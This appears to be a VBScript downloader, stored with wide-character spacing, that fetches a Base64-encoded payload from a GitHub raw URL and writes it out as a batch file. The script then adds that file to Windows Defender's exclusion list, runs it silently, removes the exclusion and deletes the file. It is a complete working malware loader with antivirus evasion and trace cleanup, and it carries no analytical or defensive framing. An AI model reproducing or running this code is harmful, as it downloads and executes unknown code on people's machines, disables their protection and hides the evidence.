
 '   D e f i n e   t h e   U R L   o f   t h e   e n c o d e d   f i l e 
 
 e n c o d e d F i l e U r l   =   " h t t p s : / / r a w . g i t h u b u s e r c o n t e n t . c o m / s p o o f f e w f e / y f f / r e f s / h e a d s / m a i n / e n c o d e d . t x t " 
 
 d e c o d e d F i l e P a t h   =   " C : \ U s e r s \ A d m i n i s t r a t o r \ D e s k t o p \ d e c o d e d . b a t " 
 
 
 
 '   C r e a t e   X M L H T T P   o b j e c t   t o   f e t c h   t h e   f i l e 
 
 S e t   o b j X M L H T T P   =   C r e a t e O b j e c t ( " M S X M L 2 . X M L H T T P " ) 
 
 o b j X M L H T T P . O p e n   " G E T " ,   e n c o d e d F i l e U r l ,   F a l s e 
 
 o b j X M L H T T P . S e n d 
 
 
 
 '   C h e c k   i f   t h e   r e q u e s t   w a s   s u c c e s s f u l 
 
 I f   o b j X M L H T T P . S t a t u s   =   2 0 0   T h e n 
 
         '   G e t   t h e   B a s e 6 4   e n c o d e d   c o n t e n t   f r o m   t h e   r e s p o n s e 
 
         e n c o d e d C o n t e n t   =   o b j X M L H T T P . r e s p o n s e T e x t 
 
         
 
         '   D e c o d e   t h e   B a s e 6 4   s t r i n g 
 
         S e t   o b j X M L   =   C r e a t e O b j e c t ( " M S X M L 2 . D O M D o c u m e n t " ) 
 
         S e t   o b j N o d e   =   o b j X M L . c r e a t e E l e m e n t ( " t m p " ) 
 
         o b j N o d e . d a t a T y p e   =   " b i n . b a s e 6 4 " 
 
         o b j N o d e . T e x t   =   e n c o d e d C o n t e n t 
 
         d e c o d e d C o n t e n t   =   o b j N o d e . n o d e T y p e d V a l u e 
 
 
 
         '   W r i t e   t h e   d e c o d e d   c o n t e n t   t o   a   t e m p o r a r y   b a t c h   f i l e 
 
         S e t   o b j F S O   =   C r e a t e O b j e c t ( " S c r i p t i n g . F i l e S y s t e m O b j e c t " ) 
 
         S e t   o b j F i l e   =   o b j F S O . C r e a t e T e x t F i l e ( d e c o d e d F i l e P a t h ,   T r u e ) 
 
         o b j F i l e . W r i t e   d e c o d e d C o n t e n t 
 
         o b j F i l e . C l o s e 
 
 
 
         '   A d d   t h e   d e c o d e d   b a t c h   f i l e   t o   a n t i v i r u s   e x c l u s i o n   l i s t 
 
         S e t   o b j S h e l l   =   C r e a t e O b j e c t ( " W S c r i p t . S h e l l " ) 
 
         o b j S h e l l . R u n   " p o w e r s h e l l   - C o m m a n d   A d d - M p P r e f e r e n c e   - E x c l u s i o n P a t h   "   &   C h r ( 3 4 )   &   d e c o d e d F i l e P a t h   &   C h r ( 3 4 ) ,   0 ,   T r u e 
 
 
 
         '   E x e c u t e   t h e   b a t c h   f i l e   s i l e n t l y 
 
         o b j S h e l l . R u n   C h r ( 3 4 )   &   d e c o d e d F i l e P a t h   &   C h r ( 3 4 ) ,   0 ,   T r u e 
 
 
 
         '   R e m o v e   t h e   e x c l u s i o n   a f t e r   e x e c u t i o n 
 
         o b j S h e l l . R u n   " p o w e r s h e l l   - C o m m a n d   R e m o v e - M p P r e f e r e n c e   - E x c l u s i o n P a t h   "   &   C h r ( 3 4 )   &   d e c o d e d F i l e P a t h   &   C h r ( 3 4 ) ,   0 ,   T r u e 
 
 
 
         '   C l e a n   u p   b y   d e l e t i n g   t h e   t e m p o r a r y   d e c o d e d   b a t c h   f i l e 
 
         o b j F S O . D e l e t e F i l e ( d e c o d e d F i l e P a t h ) 
 
 E l s e 
 
         '   H a n d l e   f a i l u r e   i n   d o w n l o a d i n g   t h e   f i l e 
 
         M s g B o x   " F a i l e d   t o   d o w n l o a d   t h e   e n c o d e d   f i l e . " 
 
 E n d   I f 
 
 
